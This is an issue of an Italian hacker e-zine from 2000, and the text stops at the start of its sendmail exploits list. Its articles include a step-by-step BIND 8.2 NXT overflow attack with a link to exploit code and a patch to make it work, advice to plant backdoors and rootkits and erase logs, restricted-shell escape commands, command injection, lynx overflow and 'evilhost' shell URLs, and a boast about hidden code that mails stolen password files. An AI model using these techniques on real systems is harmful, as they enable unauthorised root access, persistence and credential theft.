[------------------------------[Bo0zeD t0XiNS]-------------------------------]

    .,::      .:      :::::::.  :::::::..     :::.      ::: :::.    :::.
    `;;;,  .,;;        ;;;'';;' ;;;;``;;;;    ;;`;;     ;;; `;;;;,  `;;;
      '[[,,[['         [[[__[[\. [[[,/[[['   ,[[ '[[,   [[[   [[[[[. '[[
       Y$$$P     cccc  $$""""Y$$ $$$$$$c    c$$$cc$$$c  $$$   $$$"Y$c$$
     oP"``"Yo,        _88o,,od8P 888b "88bo, 888   888, 888   888    Y88
  ,m"       "Mm,      ""YUMMMP"  MMMM   "W"  YMM   ""`  MMM   MMM     YM

  [ e X t r e m e - B r a i n   S h o r t   C i r c u i t   e - z i n e ]
  [  Y o u  n e e d  i t .  Y o u  w a n t  i t .  H e r e  i t  i s .  ]

                            /useit@yourownrisk/

[Bo0zeD t0XiNS]                                          X-Brain Issue n.2

[############################################################################]
[---------------------------eXtreme-Brain------------------------------------]
[--------------------------------Nø2-----------------------------------------]
[------INTRO-----------------------------------------------T0RMENT0----------]
[------X-BRAIN STORMING------------------------------------NEMBO[K]----------]
[------RIFLESSIONE-----------------------------------------T0RMENT0----------]
[------------------------------HackinG---------------------------------------]
[------BIND: DALLO SPOOFING ALL'EXPLOIT--------------------T0RMENT0----------]
[------SHELL RISTRETTE: TUTTO CIO' CHE SI PUO'-------------T0RMENT0----------]
[------HACKING 127.0.0.1: PARTE 2--------------------------THIN[K]-----------]
[------XLIB - FUNZIONI RISCHIOSE---------------------------T0RMENT0----------]
[------IE5 BUGS--------------------------------------------T0RMENT0----------]
[------------------------------Phreaking-------------------------------------]
[------GUIDA ALLA CLONAZIONE DEI CELLULARI-----------------T0RMENT0----------]
[------------------------------TheorY----------------------------------------]
[------INSIDE TCP/IP---------------------------------------NEMBO[K]----------]
[------ICQ, DI TUTTO DI PIU'-------------------------------UND3RK00L---------]
[------SEMPLICE PROGRAMMAZIONE DEI SOCKET IN PERL----------NEMBO[K]----------]
[------------------------------OutrO-----------------------------------------]
[------------------------------EoF-------------------------------------------]
[############################################################################]

                          =================
				INTRO
                          =================

Uscita primo numero: 24 Dicembre 1999
Uscita secondo numero: 10 Luglio 2000

7 mesi sono un po' troppi......ma la fantasia e' poca ed il lavoro e'
duro :).....siate felici di questo num. visto che avevamo profilato gia' da
tempo una possibile chiusura di questa e-zine....ma ora siamo qui...
Nuovi articoli tecnici e, a breve tempo, divertenti.
Vi ricordo l'email: x-brain@iname.com  
Qui potrete inviare i vostri commenti, le vostre domande, o le vostre
critiche, non inviate allegati ma solo e-mail in formato testuale.
Vi ricordo che puo' collaborare chiunque inviando un'e-mail a
xj@interpuntonet.it e mettendo nel soggetto 'Richiesta Collaborazione'
mentre nel corpo inserite l'oggetto del vostro articolo. 
In seguito sarete contattati da me (ehm).
Che altro c'e' da aggiungere? Dimenticavo di dirvi che l'url di
reindirizzamento bo0zed.cjb.net con il client lynx vi manda
ad una pagina inesistente (problema risolvibile, ma con persone che hanno
pazienza e soprattutto tempo!).
Ma ora passiamo la parola al nostro inviato nEMBO[K] che ci ha preparato
davvero un'ottima intro.

[############################################################################]

                ---[   X - B r a i n   S t o r m i n g  ]----
                -----[ nEMBO[K] - nembokid@crosswinds.net ]--

   Mentre dselect frulla e decide vita e morte dei miei pacchetti,
 scrivo queste quattro righe sull'onda di un pensiero...

Secondo numero di X-Brain. Dopo il grande successo del primo numero...

<nEMBO[K]> we, hai ricevuto qualche email?
<T0rment0> macche', solo 4 pazzi
<nEMBO[K]> ah, allora ti sono arrivate le mie fake =)

...eccovi il secondo.

   Siamo consapevoli che , in un mare di informazioni, non e' sempre
 facile scegliere. Il nostro intento e' di divulgare informazioni, scambiare
 idee, perfezionare la nosta conoscenza. E nei limiti del possible, consci 
 delle  nostre limitate risorse mentali, lo stiamo facendo.
   Sono ben accolte critiche, consigli e collaborazioni.

    Mi capitano ultimamente casi su IRC del tipo "Sai hackare?
 mi serve una shell per mettere un bot" seguite poi da "ma quando
 ottieni la shell, nella pratica che hai in mano ?". Gli ZeroCool,
 gli AcidBurn , i NEO, e i Matrix si sprecano, gli "hacker" da strapazzo 
 ne trovi come la pubblicita' su mediaseZ ...

< il piccolo : AIUTO!!!! MAMMA AIUTO!!!! C'e' Un hacker nel mio pc!!
 la mamma : Non ti preoccupare, adesso lo caccio subito...brutti acari...
 il piccolo : Ngueeeeeeee ngueeeeeee
 la mamma : Beccati questo sniffer , ora muori! >

   Le masse si stanno accorgendo delle potenzialita' di Internet, 
 "Lavora con Internet, Prenota con Internet, Scopati Internet, Mangia
 con Internet, Stira lava e cucina con la Rete..."
   Altri si stanno , volenti o nolenti , accorgendo che la sicurezza 
 non e' un optional, e che non va sottovalutata, indipendentemente 
 dai fini personali e dal motivo per cui interessa la rete. Cose gia' 
 arcinote a chi da tempo bazzica in rete . Per esempio, Aleph One gia' 
 da tempo aveva elencato i motivi per i quali chi scrive software non 
 e' sempre motivato a dare un occhio di riguardo per la sicurezza del 
 programma.

   Ecco a cosa servono gli hacker.

   Ecco chi scrive mega e mega di codici per migliorare la
 sicurezza dei software che utilizziamo.

   O fate parte anche voi della massa di gente che crede che gli hacker
 siano quelli che impediscono l'accesso ai portali internet e fanno cadere
 la gente da IRC con il winnuke? [ funziona ancora? ]

    A volte il vento sembra cambiare, almeno nel piccolo le cose
 incominciano a quadrare, e la differenza tra hacker e cracker sembra
 farsi strada nelle menti di tutti. Grazie anche a lettere come quella
 di vecna su "La Repubblica", e a tutti quelli che , per un motivo o per
 un altro , hanno a cuore la parola "smanettone" e non vogliono 
 che sia affiancata a "pirata informatico", "ladro", e simili.

    Dopo gli attacchi a Yahoo! , aMazon , AOL e altri grandi
 magnati [ nel senso che magnano ] dell'informatica non passa giorno
 che ci sia su di un giornale qualcosa sulla figura dell'hacker.
 Adesso e' la volta del virus [ anzi, dello script in VB ] I-LOVE-YOU.
 "Ingente quantita' di risorse usate per braccare l'hacker", forse ,
 filippino. E' stato un lavoro duro, quello di risalire a lui -dicono-, 
 mentre ecco cosa appare all'inizio di LOVE-LETTER-FOR-YOU.TXT.vbs :

 rem  barok -loveletter(vbe) <i hate go to school>
 rem  by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group 
      / Manila,Philippines

  In tutto questo il caro vecchio Bill finalmente ha dovuto cedere,
 [ saranno state tutte le benedizioni che ha ricevuto dalla comunita'
 linux? :) ] e adesso dovra' mettere a disposizione di tutti i codici 
 di Windowz, tutti potranno smanettare sul codice, i bug verranno fuori 
 subito...cosa ne uscira'? Linux-Windows2000? Sicuramente qualcosa di
 buono.

 Ok, ho finito con le elucubrazioni mentali. 
  Spero che abbiate piacere di leggere il secondo numero di X-Brain, 
  altrimenti...il vostro pc si autodistuggera' in poco meno di 30 
  secondi =) . Keep reading...

						Enjoy,
					       nEMBO[K]

[############################################################################]

                       =======================
                             RIFLESSIONE
                       =======================

La dove ogni crisi spirituale si ferma, in quel paradigma esistenziale,
voglio andare oltre le mie capacita' per scovare un concetto plausibile,
spesso trovo rifugio dentro me, senza affrontare chi mi sfida. Senza la
mia curiosita' non sono nessuno, senza il C 64 non sarei stato nessuno, ma
d'altronde io non sono nessuno. Vedo tecnici che si scambiano pareri su
come installare quello o questo software, assistenti che vedendo una
schermata blu di Win formattano l'HD, professori che conoscono il Linux
solo perche' il nome gli ricordano vagamente quel SO 'Unix' di cui gli
avevano tanto parlato nell'ultimo corso di aggiornamento tenutosi nel
1980. A questo punto punto mi viene da ricredere sulla mia identita',
sulla posizione, ma affrontandola mi accorgo che tutti sono nessuno, e
nessuno e' qualcuno. Una frase da quinta elementare ma che al suo interno
racchiude un profondo significato. 
Ultimamente ho partecipato ad una mostra di programmi: dopo alcuni giudizi
positivi da parte di (finti) programmatori, la mia squadra e' stata
squalificata solo perche' non conoscevamo nessuno della giuria. A questo
punto mi viene molto da pensare su come funziona questa routine
quotidiana, questo merda nella quale siamo immersi. Ma forse e' meglio che
non abbiamo vinto, d'altronde nel prog ho incluso del codice che trova
eventuali socket aperti e mi invia il PWL alla mia e-mail....
La morale? Trovatela voi...

							T0rment0

[############################################################################]
[------------------------------] HackinG [-----------------------------------]
[############################################################################]

                    ExP-<--<--<--<--<--<--<--<--<--<--<-eXp
                       BIND: DALLO SPOOFING ALL'EXPLOIT
                    eXp->-->-->-->-->-->-->-->-->-->-->-ExP


1) TEORIA SUL DNS
2) CONFIGURAZIONE DI UN DNS
3) EXPLOIT DI UN SERVER VULNERABILE

1) TEORIA SUL DNS
--------------------------

Un DNS (Domain Name Server), e' usato per convertire hostname in IP e
viceversa. Per esempio: www.infoseek.com = 204.162.96.173 
      
Prima di tutto, dovete sapere che quando configurate il vostro TCP/IP per la
connessione e avete un collegamento dial-up, vi viene assegnato
automaticamente un DNS da parte del vostro ISP che vi permette appunto di
convertire il vostro bel indirizzo www.worldsex.com quando lo inserite nel
vostro browser nel suo corrispondente IP. Per creare delle query verso i
server DNS, esiste un programma sotto Unix chiamato 'nslookup" che ha la
seguente sintassi:

[T0rnACumE@/root]# nslookup <hostname>
                o
[T0rnACumE@/root]# nslookup <ip>

Un server DNS ben configurato deve possedere due liste per i domini chiamati
i files di Zona. Un file di Zona e' usato per la risoluzione di hostname in
indirizzi IP, l'altro invece serve appunto per il reverse lookup.
Nslookup puo' essere usato in modo interattivo. Basta che digitiamo al prompt
nslookup per avere un prompt come questo ">"
A questo inseriamo l'IP o l'hostname interessato. Questo programma presenta
anche una serie di comandi interni che vedremo dopo.

Ricordate che possiamo exploitare solo i Name Server. 
All'inizio dobbiamo ricavarci la versione del servizio DNS che sta eseguendo
l'host remoto (e' ovvio che dobbiamo sapere prima l'OS!) Per far cio' useremo
un tool chiamato 'dig' e presente su molti Unix.
La sintassi deve essere questa:
     
[T0rnACumE@/root]# dig @<ip> versione.bind chaos txt | grep \"8

A questo punto controllate l'output, se vedete: 8.2 o 8.2.1 o 8.2.2 il named
e' vulnerabile. Se invece vedete 8.2.2P2 - P5, non lo e'.
Se non ricevete nessun output ed il vostro terminale si blocca, significa che
su quel server e' stato editato il file di configurazione in modo che non dia
nessuna informazione riguardo la propria versione... cio' significa che
potrebbe essere buggato!


2) CONFIGURAZIONE DI UN DNS
---------------------------

La prima cosa che vi tocca conoscere e' che il DNS si basa solo su file di
testo, quindi le entry di questo file sono delle semplici linee che vengono
aggiunte man mano e poi, dopo la modifica, il DNS viene riavviato. Il file
principale che controlla il servizio DNS e' /etc/named.conf o /etc/named.boot.
Se /etc/named.conf esiste, e' questo il file con il quale dovrete lavorare.

L'ho detto prima, un DNS appropriato possiede due liste o un file di Zona per
ogni dominio che serve. E' necessario modificare quel file di zona per
cambiare o aggiungere entry a quel dominio. Un dominio e' per esempio
infoseek.com e l'hostname e' www, il FQDN e' www.infoseek.com. FQDN sta per
Fully Qualified Domain Name. Per trovare il file di zona da FQDN a IP per il
dominio infoseek.com, dobbiamo prima creare una query verso il nostro server
DNS in modo che ci dica quale sia il DNS primario per infoseek.com.
Si procede in questo modo:
                    
[T0rnACumE@/root]# nslookup
Default Server:  xxxxxx.xxxxxxx.xx.xx
Address:  xxx.xx.xx.xx
>set q=ns<ENTER>
>infoseek.com<ENTER>
>infoseek.com      nameserver = NS-UU.infoseek.com
>NS-UU.infoseek.com    internet address = 198.5.208.3

Come potete vedere, ora abbiamo l'IP del DNS primario di infoseek.com.
Supponiamo di essere root li' (vi piacerebberesse, eh? ;) Ci logghiamo al loro
DNS e apriamo il file /etc/named.conf. Notiamo che in testa al file e'presente
una sezione di opzioni e c'e' una linea simile alla seguente:
directory "/var/named"
Questo significa che il file di zona e' situato in /var/named. Diamo un
occhiata anche al resto e vediamo qualche sezione di zona per il dominio
www.infoseek.com:

         zone "infoseek.com"{
              type master;
              file "infoseek.com.zone";
         };

Da cio' abbiamo intuito che il file di zona e': /var/named/infoseek.com.zone,
ed e' quello il file che dobbiamo modificare.
         
Per primo diamo un'occhiata al file di zona. Vediamo all'inizio un record SOA,
che probabilmente vi apparira' come un miscuglio di testi e comandi.
In seguito vediamo:
                 
     @                 IN     NS      NS-UU.infoseek.com.
     www               IN     A       204.192.96.173
     ftp               IN     CNAME   corp-bbn
     corp-bbn          IN     A       204.192.96.2
     .
     .
     .
         
Come possiamo vedere, ci sono molti tipi di record, per far funzionare il
nostro exploit dobbiamo focalizzare la nostra attenzione su un record, il NS.
       
Un record A e' il tipico hostname nel tipo record IP.
CNAME e' un Nome Canonico, che e' un alias al record di tipo A.
Un record PTR e' un record Puntatore, che e' l'opposto di A, esso punta
l'indirizzo IP al FQDN. il PTR viene usato nell'altro file di zona.
Ora non voglio mettermi a discutere del protocollo DNS visto che e' presente
tanto di quel materiale attinente ad esso sulla rete che basta fare una
ricerca con la parola "sex" (eheh).
        
Un record NS e' un record di tipo Name Server che indica qual'e'il Name Server
per un dominio specifico o sottodominio.
          
Non so se ci avete fatto caso ma il record NS finisce con un '.' Questo
perche' e' stato specificato il FQDN e non l'hostname. Quando viene omesso
il '.', il nome del dominio viene aggiunto dopo l'hostname e quindi se
omettiamo l'ultimo punto avremo un dominio come questo:
         
NS-UU.infoseek.com.infoseek.com.
        
Cosi' invece di:

www                    IN      A       204.192.96.173

Potremo scrivere:
           
www.infoseek.com      IN      A       204.192.96.173
          
Che e' la stessa cosa.
         
Per far funzionare il nostro exploit dobbiamo aggiungere un sotto dominio al
nameserver. Cosi' supponiamo ancora di essere root su

NS-UU.infoseek.com.
         
Come facciamo ad aggiungere un sotto dominio?

Dobbiamo semplicemente aggiungere un altro record NS.

sottodominio              IN      NS      bo0zed.tox.com.

cio' significa che il name server del dominio sottodominio.infoseek.com
dovra essere bo0zed.tox.com. bo0zed.tox.com ha bisogno di essere risolto
all'indirizzo IP del vostro pc, cosi' al suo posto inserite il vostro FQDN.
       
Ora dobbiamo far ripartire il name server in modo da rendere effettivi i
cambiamenti attuati. Si puo' fare attraverso il seguente comando:
         
[T0rnACumE@/root]# /usr/sbin/ndc restart<INVIO>
new pid is 24654
[T0rnACumE@/root]#


3) EXPLOIT DI UN SERVER VULNERABILE
-----------------------------------

Di cosa abbiamo bisogno per eseguire l'exploit? Hmm...forse di un cervello? ;)
Dovrete possedere dei privilegi root su un Name Server Primario che e'
autoritativo per un Dominio sulla rete. Oppure avrete bisogno di un pc da cui
potete eseguire l'exploit. Per le richieste DNS, dovrete chiedere a qualcuno
che ha privilegi root su un DNS di editare un file di zona per voi.                  

L'exploit usa un buffer overflow nelle versioni di Bind 8.2 - 8.2.2 che
rendono l'accesso remoto da root. L'exploit sta in ascolto sulla porta 53 del
pc locale, e funziona come un server DNS. Quando qualcuno gli invia una query,
esso risponde con un record NXT grande che al suo interno contiene il codice
che exploitera' il server remoto.

http://www.hack.co.za/daem0n/named/t666.c

Dopo averlo scaricato bisogna effettuare una piccola modifica al codice
sorgente. Perche' ? Provatevi a scaricare l'exploit e ad eseguirlo!
Dopo tanta fatica non otterrete la shell di root perche' ...
Per patcharlo vi basta cambiare 3 caratteri. Vi do' di piu', questi che
seguono sono i corrispondenti codici esadecimali dei caratteri da inserire:

0x62,0x69,0x6e

Volete sapere anche come compilarlo? Allora, un compilatore e' un traduttore
scritto in un determinato linguaggio macchina e traduce da programma sorgente
a programma oggetto. A questo punto il codice non e' direttamente eseguibile
e viene chiamato programma rilocabile perche' ha una serie di indirizzi
fittizzi. ....Volete che vi spieghi proprio tutto?
Dopo averlo compilato per eseguirlo dovrete essere root su una macchina e
selezionare una delle architettutre disponibili.
Ora l'exploit si mette in ascolto sulla porta 53 (se si sta eseguendo un
server DNS sulla macchina dove vogliamo far girare l'exploit, dobbiamo prima
killare il name server attraverso: killall -9 named ).
L'exploit ora attende delle query, se qualcuno inviera' una query al vostro
server riceverere un output come questo:

Received request from xxx.xx.xx.xx:1025 for xxx.xxxxxxxxx.xx.xx type=1

Se la richiesta e' partita da un server DNS, esso entrera' in un ciclo di
proxy, e se e' un server vulnerabile, avrete una bella shelluzza da root sul
server remoto.

Farsi fare una query da un server vulnerabile e' molto semplice, una volta
aggiunto un sottodominio in un name server sulla rete e creato da soli il
nostro DNS, l'unica cosa che rimane da fare e' la query del server vulnerabile
al nostro host all'interno del sottodominio aggiunto.

[T0rnACumE@/root]# nslookup
>server <hostvittima><INVIO>
>www.sottodominio.infoseek.com<INVIO>

In questo caso e' il server che chiedera'a NS-UU.infoseek.com per l'IP di
www.sottodominio.infoseek.com. NS-UU.infoseek.com fara' partire la ricerca e
ricavera' il sottodominio, perche' il sottodominio ha un suo record NS, esso
dira' al computer vittima che bo0zed.tox.com sara' un Name Server Autoritativo
per il dominio sottodominio.infoseek.com (vi ricordate?) Ora succedera' che
l'host vittima fara' una query a bo0zed.tox.com per l'indirizzo ip di
www.sottodominio.infoseek.com. OLE!

Quando exploitiamo il BIND, avviene un crash del named, cosi' l'accesso root
sara' nostro solo in quel momento. Quindi dobbiamo approfittarne piazzandoci
una bella backdoor, piazzarci un rootkit e cancellare i log.
Vabbe' tutto il resto e' paese...;)

                                                                 T0rment0   

[############################################################################]

             ==================================================  
                   SHELL RISTRETTE: TUTTO CIO' CHE SI PUO'
             ==================================================             

Riuscire ad evadere quel limite assegnato da una shell ristretta?
Da oggi si puo'!

Molte volte e' capitato di trovarsi dinanzi ad una shell ristretta che
permetteva solo un certo numero di operazioni. E quante volte nella nostra
testolina e' venuta quella voglia matta di prendere l'accesso root.
Bene, in questo articolo vi diro' alcuni trucchi per soggiocare quei limiti.

P.s. Sono solo a puro scopo informativo visto che molti di questi metodi
usati qui non funzionano piu'. 


1 IL MENU (Oh che bello!)

Di solito in una shell ristretta vi appare un menu dove potete eseguire un
numero limitato di operazioni. Tipo: mail, irc, pico, ftp, telnet, etc.
Conoscere il programma con il quale si sta avendo a che fare e' il primo passo
da compiere. Ma ora iniziamo con i singoli servizi.

1.1 Accesso a vi

Questo e' un trucco abbastanza datato e se ne parlava addirittura nella faq
di 2600. Aprite VI e scrivete il seguente comando:

:shell=/bin/sh

Poi passate alla shell usando il seguente comando

:shell

NOTA:
Se la shell ristretta previene l'uso del comando "CD", eseguite il comando
attraverso il server ftp dal vostro account.

1.2 Accesso al programma "mail" 

Se si ha accesso al programma di e-mail, basta seguire i seguenti passi:

Eseguite il programma mail, se c'e' la possibilita' di scegliere quale
programma usare, scegliete 'mail' anziche' 'pine'.

Se non c'e' nessuna e-mail da parte di utenti, vi sara' una mail che vi
informa della non presenza di e-mail nell'account.
        
   ORA DOVETE SPEDIRVI UNA E-MAIL DA SOLI

Selezionate l'opzione per l'email e vi apparira' qualcosa del genere:

   Mail version ?. Type ? for help.
   "/var/spool/mail/user1": 1 messages

   > 1 user1@mio.host.it Thu Sep 1 1:11 1/98  "test"
   & 

  Ok cosi' siamo nel prompt della mail e basta scrivere quanto segue:

   &!/bin/sh[invio]
   $    <------------ Ops! :).

   Nota: Molti programmi usano l'identificatore ! per lasciare
         la diretta esecuzione dei comandi della shell.

1.3 FTP e Telnet

Anche FTP e Telnet permettono di richiamare comandi della shell al loro
interno, sempre attraverso l'identificatore '!' . Esempio:


 ftp> !ps   <-------- !(comando)
  PID TT STAT  TIME COMMAND
 2679 p2 S     0:01 -menu
 2832 p2 R     0:00 ps

telnet>!ps
 PID TT STAT  TIME COMMAND
 2679 p2 S     0:01 -menu
 2832 p2 R     0:00 ps

Qualche volta puo' capitare che l'esecuzione dei comandi come quella vista
sopra non avvenga, questo fattore puo' dipendere anche dal path, quindi in
caso di insuccesso meglio riprovare con l'intero path del comando.

Esempio:

ftp> !/usr/bin/ps
PID TT STAT  TIME COMMAND
 2679 p2 S     0:01 -menu
 2832 p2 R     0:00 ps

NOTA: Provate sempre l'esecuzione di !/bin/sh

NOTA PER GLI UTENTI DI WINCAZZ: Per avere il controllo totale su questi
sistemi e' logico sosituire al /bin/sh, il commando.com in questo modo:
                                                                       
           ftp>!command.com
           Microsoft<R> Windows NT DOS
           <C>Copyright Microsoft Corp 1990-1996.

           C:\>

Mentre nell'FTP questa operazione risulta facile, nel Telnet a volte puo'
essere piu' difficile infatti capita spesso che appena si seleziona l'opzione
Telnet dal menu, subito viene richiesto l'host col quale connettersi.
Per evitare questa richiesta subito dopo la scelta dal menu, premere
CTRL + ] in modo da bloccare qualsiasi operazione dopo la scelta e far
apparire il prompt di telnet.

1.4 IRC 

Se il menu o la shell ristretta da la possibilita' di avere accesso ad IRC,
quando entriamo nel client possiamo provare ad eseguire un comando attraverso:
/EXEC (comando). 
              
1.5 Lynx 

Anche Lynx puo' essere usato come programma che da' la possiblita di eseguire
comandi arbitrari sul sistema. Attraverso lynxexec e lynxprog.

Esempio.
      lynxexec:ls -l       
      lynxprog:news
      lynxexec:/bin/sh

Esempio.
      lynx lynxexec://localhost/finger


1.6 ALTRO

Alcune shell ristrette usano un comando chiamato 'more' che vi mostra,
per esempio, una lista divisa in piu' parti. Infatti questo programma effettua
una suddivisione di un output in piu' pagine in caso di occupazione di tutta
la pagina, e l'utente per continuare a leggere deve premere la barra.
Se questo programma e' in funzione sul vostro account ristretto, anche qui
e' possibile passare all'esecuzione di comandi della shell attraverso il '!'.

!/bin/sh  (eseguira' la shell)
$

------------------------------------------------------------------------------

2. Implementazione

Tutti i vari trucchetti sono strettamente legati dal tipo di linguaggio o
programma usato per la realizzazione del menu o della shell.
Quindi alcune volte e' necessario attuare delle modifiche affinche'
questi passaggi spiegati sopra funzionano.

2.1. TRAPPOLE

Come ben sappiamo, almeno credo, Unix usa delle combinazioni di tasti per
la creazione di segnali che a volte possono pure interrompere l'esecuzione.
Se il menu e' stato programmato in modo che ad un dato segnale si interrompa,
eccovi alcuni dei segnali piu' usati:

        CONTROL + C    (Blocca l'esecuzione)
        CONTROL + Z    (Sospende l'esecuzione)
        CONTROL + D

NOTA: Di sicuro non funzionera' ma tentar non nuoce!

2.2 Configurazione 

Alcuni menu hanno un menu di setup dove e' possibile modificare la propria
configurazione. Per esempio si puo' modificare il tipo di editor, o il tipo
di irc client o il client mail.

Alcune volte e' possibile anche qui far eseguire dei comandi a piacere,
vediamo come. Quando ci viene chiesto quale editor usare, invece di inserire
un editor che ci viene suggerito, inseriamo degli spazi seguiti dal pulsante
invio. Quando torniamo al menu principale, ci viene chiesto quale file
aprire per l'editing, a quel punto inseriamo il comando da eseguire.
Vediamo un esempio pratico:

(Setup Option)
     Type The Text Editor to use (Pico , Vi)?:        _ <--- spazi
(Main Menu, "Edit" Option )
     Type the filename to edit:  ps    <------ Comando

       PID TT STAT  TIME COMMAND
      2679 p2 S     0:01 -menu
      2832 p2 R     0:00 ps

Beh tutto questo dipende solo ed esclusivamente da come sia stato programmato
il menu..... :|

2.3 File di inizializzazione e di configurazione

Di solito quando entriamo in un account, la shell esegue automaticamente
alcuni comandi inclusi in certi file (es. .profile, .login ).                 

Alcuni amministratori di sistema includono la linea del menu proprio in questi
file. Quindi se i permessi non sono stati settati, possiamo modificarlo
anche noi cancellando appunto quella linea che esegue il menu in automatico.
Possiamo provarlo a modificare sia dall'editor del menu, che dall'FTP.

Se riuscite a vedere il contenuto del file di setup e, constatate che il menu
viene chiamato direttamente senza il path, potete creare un file con lo stesso
nome, contenente la linea /bin/sh e piazzarlo nel vostro account.

2.4 Comandi collegati

Un'altra forma per eseguire comandi e' usare caratteri dopo il comando
della shell ristretta. Esempio:

user1> finger @mio.host.it;ps     <---------------- Guardate il ";"
[mio.host.it]

Welcome to Linux version 2.0.35 at mio.host.it !

  4:02pm  up 6 days,  2:51,  3 users,  load average: 0.05, 0.02, 0.00

Login     Name      Tty  Idle  Login Time   Office     Office Phone
user1                      p0     1  Sep 11 14:38 (xxx.25.64.xxx)
user2                      p1        Sep 11 16:01 (xxx.25.65.xxx)
user3                      p3     4  Sep 11 15:29 (xxx.25.68.xxx)

  PID TTY STAT  TIME COMMAND
 9562  p1 S    0:00 -tcsh
 9576  p1 R    0:00 ps

user1>     

Ora sappiamo che in una linea possiamo inserire piu' comandi 
attraverso il separatore ';' ma anche piu'. 
Se a volte si inserisce un paramtro per un comando interno,
anche qui andra' bene la tecnica del separatore ';'.
Esempio:

      (Finger Menu Option)
                Type the Host: www.host.it;ps
      (this will execute "finger @www.host.it;ps" )

[www.host.it]

Welcome to Linux version 2.0.35 at www.host.it !

  4:02pm  up 6 days,  2:51,  3 users,  load average: 0.05, 0.02, 0.00

Login     Name      Tty  Idle  Login Time   Office     Office Phone
user1                      p0     1  Sep 11 14:38 (xxx.25.64.xxx)
user2                      p1        Sep 11 16:01 (xxx.25.65.xxx)
user3                      p3     4  Sep 11 15:29 (xxx.25.68.xxx)

  PID TTY STAT  TIME COMMAND
 9562  p1 S    0:00 -menu
 9576  p1 R    0:00 ps


2.5 Ora eseguo i comandi, ma cosa posso fare ?

Tutto: (Buffers Overflows, ecc ecc).

Di solito non troverete facilmente la strada per lasciare direttamente
la shell ma potete eseguire qualsiasi comando che volete.
Modificate un exploit che invece di eseguire nel suo codice /bin/sh , 
esegue un programma che per esempio modifica la linea nel file /etc/passwd
e nel file /etc/shadow, in modo da eseguire direttamente la shell ogni 
volta che ci logghiamo.                          

Compilatelo su un altro host e uploadatelo sul vostro account. 
Ora eseguitelo come un comando semplice, il resto dipende dalla vostra 
immaginazione.
  
  
3. EXPLOITS DEI COMANDI COMUNI

Ecco qualche exploit che puo' esserevi utile:

3.1 Bugs di lynx 
   -------------

Michal Zalewski (lcamtuf@IDS.PL)
Sun, 6 Sep 1998 00:53:24 +0200 

Ecco gli overflow:

<a href="rlogin://(circa 1454 lettera 'A')">...</a>,
<a href="telnet://(circa 1454 lettera 'A')">...</a> o
<a href="tn3270://(circa 1454 lettera 'A')">...</a>

Scegliete il vostro protocollo preferito, che segni il SEGV in 0x41414141. 
Oppure gli overflows in finger://, cso://, nntp:// e news://. 
Sfortunatamente non sono cosi' facili da exploitare. 1454 bytes sono perfetti
per lynx 2.8.x sotto Linux. Ma possono variare sulle altre piattaforme. 
 
------------------------------------------------------------------
Artur Grabowski (art@STACKEN.KTH.SE)
Tue, 17 Nov 1998 17:06:00 +0100 

Lynx ha un opzione che permette i trojan

Per gli utenti sul sistema dove lynx e' la shell login o e' il solo programma
di cui e' permessa l'esecuzione, l'utente puo' ottenere la shell
semplicemente  cliccando su un link che assomiglia a questo:

<a href="rlogin://foo;sh@foo">foo</a>.

L'esecuzione di questo codice e' anche facile con questa opzione:
<a href="rlogin://eviluser|sh@evilhost.foo">foo</a>. 
La shell di login per eviluser@evilhost.foo stampa un po' di comandi
da eseguire sulla vittima.

3.2 Bugs di PINE 

(Chris Wilson <cmw32@HERMES.CAM.AC.UK>)

Una vulnerabilita' in Pine, esistente nella versione 3.95q, ma
probabilmente applicabile a tutte le versioni sopra la 4.02,
permette l'esecuzione dei comandi in ambienti ristretti.  
  
Quando viene selezionata una stampante, e' possibile scegliere
l'opzione "Personally selected print command."  
  
Questa permette di specificare un comando che pine eseguira' quando
verra' stampato un documento.

Cambiando il valore di questo settaggio, e' possibile eseguire 
qualsiasi comando quendo viene stampato qualcosa.


Per questo motivo gli amministratori disabilitano questo con un opzione
nel file pine.conf.fixed 
 
Ma potete modificare il file .pinerc manualmente, aggiungendo
una linea come questa:

printer=test [] echo Ciao! > test

In seguito questo saltera' le restrizioni imposte ed eseguira'
il comando ogni volta che viene stampato un documento.


=========================================================================

Allora se siete giunti fin qui significa che il vostro interesse riguardo
l'argomento e' alto, in quel caso a questo punto avete le basi per ampliare 
una delle tecniche qui descritte. 
Documento dedicato a tutti quelli che non hanno restrizioni al proprio
cervello e che vogliono evadere tutto quello che ha un limite.
Ringrazio Et di cyberspace.org per la splendida guida che ci ha reso.

								T0rment0	

[############################################################################]

-------------------------[ - Hacking 127.0.0.1 - ]-------------------------
----------------[ Fatelo voi prima che ci pensino gli altri ]--------------
--------------------------------[ Parte 2 ]--------------------------------

---[ dal jargon file:

:cracker: /n./  One who breaks security on a system.  Coined
   ca. 1985 by hackers in defense against journalistic misuse of
   {hacker} (q.v., sense 8).  An earlier attempt to establish
   `worm' in this sense around 1981--82 on Usenet was largely a
   failure.

:acaro: /n./ One who seems to be an {hacker} (q.v., sense 8).
   [ he said so, but his mother said he's still repeating the same 
   class for the 4th year ]. He has bad habits and he tells everybody
   he "hacked NASA and *.mil". He says he programs in C/C++,Perl,Assembly, 
   Pascal, Cobol, Fortran and every language known on _this_ planet. 
   [ ./a.out rules ].

[ > Termine "acaro" introdotto per mano di Pippo - l'onnipresente - ]

Ok. Fatta questa piccola premessa [ voleva essere una premessa? boh ]
andiamo avanti nello scoprire in che modo rendere piu' sicuro il proprio
sistema "crackandolo".

[SENDMAIL]

Ormai se ne parla piu' su BugTraq che da qualunque altra parte. Sendmail
e' il MTA ( mail transport agent ) per eccellenza. E' difficile da
configurare , e proprio per questo e' piu' soggetto ad attacchi. 
Durante il suo sviluppo, ricordiamo uno dei piu' famosi bug di sendmail,
"wiz". Secondo il quale bastava scrivere "wiz" ,appunto, per ottenere 
accesso come root. Da allora le cose sono cambiate, sono stati eliminati
dei bug , e ne sono stati aggiunti dei nuovi ancora piu' belli =)

Una lista dei bug e relativi exploit di sendmail trovata sul web.

                           [Sendmail Exploits]

CONTENTS

Bug 1: uudecode problem, tested on Sendmail 5.64
Bug 2: Tail creates a daemon shell, tested on 5.65
Bug 3: Bounce allows anyone to read /etc/shadow, tested on 8.6.7
Bug 4: Issue a request twice and write to an .rhosts, works on 5.x ?
Bug 5: Execute commands and grab passwd, Sendmail 5.55
Bug 6: Execute commands remotely, Sendmail 4.1
Bug 7: Shows how to gain a bin owned shell, tested on Sendmail 8.6.9
Bug 8: Read a file that you just executed, Sendmail 8.6.x
Bug 9: Shows how to gain a root shell via Sendmail 8.6.4

-----
BUG 1
-----

